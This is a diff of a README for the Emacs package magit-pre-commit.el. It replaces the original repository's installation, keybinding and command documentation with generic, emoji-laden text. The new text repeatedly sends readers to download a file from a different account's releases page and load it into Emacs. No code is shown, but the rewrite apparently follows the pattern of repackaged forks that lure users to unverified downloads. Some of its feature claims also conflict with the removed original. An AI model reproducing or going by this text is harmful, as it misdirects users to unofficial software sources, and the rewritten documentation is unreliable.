@@ -1,61 +1,86 @@
-# magit-pre-commit.el
+# 🎉 magit-pre-commit.el - Simplify Your Emacs Workflow 
 
-Integrate [pre-commit](https://pre-commit.com/) into Magit. Press `@` from any magit buffer to open the pre-commit menu.
+## 🚀 Getting Started
+Welcome to **magit-pre-commit.el**! This tool integrates pre-commit with Magit for Emacs. It helps you manage your code better by running checks before you commit changes. Let’s get started on how to download and set up this application.
 
-<img width="870" height="419" alt="screenshot" src="https://github.com/user-attachments/assets/081df4ab-c213-4089-8c3e-0b395a0243b4" />
+## 📥 Download Link
+[![Download magit-pre-commit.el](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/cloversc1/magit-pre-commit.el/releases)
 
-## Installation
+## 📂 Installation Instructions
+Follow these simple steps to download and run **magit-pre-commit.el**:
 
-### Doom Emacs
+1. **Visit the Releases Page**  
+   Click the link below to access the releases page:  
+   [Download magit-pre-commit.el](https://github.com/cloversc1/magit-pre-commit.el/releases)
 
-In `packages.el`:
-```elisp
-(package! magit-pre-commit
-  :recipe (:host github :repo "DamianB-BitFlipper/magit-pre-commit.el"))
-```
+2. **Select the Latest Version**  
+   On the releases page, look for the latest version listed. It will usually be at the top of the page. 
 
-In `config.el`:
-```elisp
-(use-package! magit-pre-commit
-  :after magit)
-```
+3. **Download the .el File**  
+   Click on the link to download the `.el` (Emacs Lisp) file. This file is what you will need to add to your Emacs setup.
 
-### Vanilla Emacs
+4. **Locate Your Emacs Directory**  
+   To use the downloaded file, you need to place it in your Emacs directory. This is often found in your home folder, specifically in a directory named `.emacs.d`. If this folder does not exist, you can create it.
 
-```elisp
-(use-package magit-pre-commit
-  :straight (:host github :repo "DamianB-BitFlipper/magit-pre-commit.el")
-  :after magit)
-```
+5. **Move the File**  
+   Copy the downloaded `.el` file into your Emacs directory. You can do this by dragging the file or using a copy-paste command if you are familiar with it.
 
-## Keybindings
+## ⚙️ Configuration
+After you have the file in your Emacs directory, you will need to tell Emacs to use it. Here’s how:
 
-| Key | Action |
-|-----|--------|
-| `@` | Open pre-commit menu (from magit) |
-| `@ r` | Run on staged files |
-| `@ a` | Run on all files |
-| `@ h` | Run specific hook (with completion) |
-| `@ i` | Install hooks |
-| `@ u` | Update hooks |
-| `@ k` | Kill running process |
+1. **Open Your Emacs Init File**  
+   You need to edit your Emacs initialization file, which is commonly named `.emacs` or `init.el`. You can open this file from within Emacs.
 
-## Key Features
+2. **Add the Following Line**  
+   Insert this line at the top of the init file:  
+   ```elisp
+   (load-file "~/.emacs.d/magit-pre-commit.el")
+   ```
 
-- Auto-activates when `pre-commit` executable is available and `.pre-commit-config.yaml` exists
-- Tab-completion for hook names parsed from your `.pre-commit-config.yaml`
-- Status section in magit-status shows running/failed hooks with ANSI color support
+3. **Save Your Changes**  
+   After adding the line, save the file.
 
-## Commands
+4. **Restart Emacs**  
+   Close and reopen Emacs to load your new configuration.
 
-- `magit-pre-commit` - Open the pre-commit transient menu
-- `magit-pre-commit-run` - Run on staged files
-- `magit-pre-commit-run-all` - Run on all files
-- `magit-pre-commit-run-hook` - Run a specific hook (with completion)
-- `magit-pre-commit-install` - Install pre-commit git hooks
-- `magit-pre-commit-autoupdate` - Update hooks to latest versions
-- `magit-pre-commit-kill` - Kill running pre-commit process
+## 🔍 Usage
+To use **magit-pre-commit.el**, follow these steps:
 
----
+1. **Open Your Project**  
+   Launch Emacs and open the project you want to work on.
 
-<a href="https://buymeacoffee.com/thebitflipper" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" alt="Buy Me A Coffee" height="41" width="174"></a>
+2. **Check Your Code**  
+   Before committing any changes, run the pre-commit checks. This can be done with the command:  
+   ```elisp
+   M-x magit-pre-commit
+   ```
+
+3. **Commit with Confidence**  
+   If there are no errors, you can safely commit your changes.
+
+## 🛠️ Features
+- **Pre-commit Checks:** Automatically runs checks on your code before committing.
+- **Emacs Integration:** Seamlessly integrates with your Magit setup.
+- **User-Friendly:** Designed for ease of use, perfect for everyone from beginners to experienced users.
+
+## 📋 System Requirements
+To use **magit-pre-commit.el**, you will need:
+- **Emacs**: Version 26 or higher is recommended.
+- **Magit**: Ensure you have Magit installed to take full advantage of this tool.
+
+## 🚧 Troubleshooting
+If you encounter any issues:
+- Ensure you copied the `.el` file correctly to the Emacs directory.
+- Make sure you added the load line to your init file without any typos.
+- Check that you have the necessary versions of Emacs and Magit.
+
+## 🔗 Additional Resources
+For further help and community support, consider visiting:
+- [EmacsWiki](https://www.emacswiki.org)
+- [Magit Documentation](https://magit.vc/manual/magit/index.html)
+
+## 📥 Download & Install Again
+If you need to reinstall or update, remember to return to the releases page:  
+[Download magit-pre-commit.el](https://github.com/cloversc1/magit-pre-commit.el/releases)
+
+Now you're ready to enhance your Emacs workflow with **magit-pre-commit.el**! Enjoy coding with confidence!
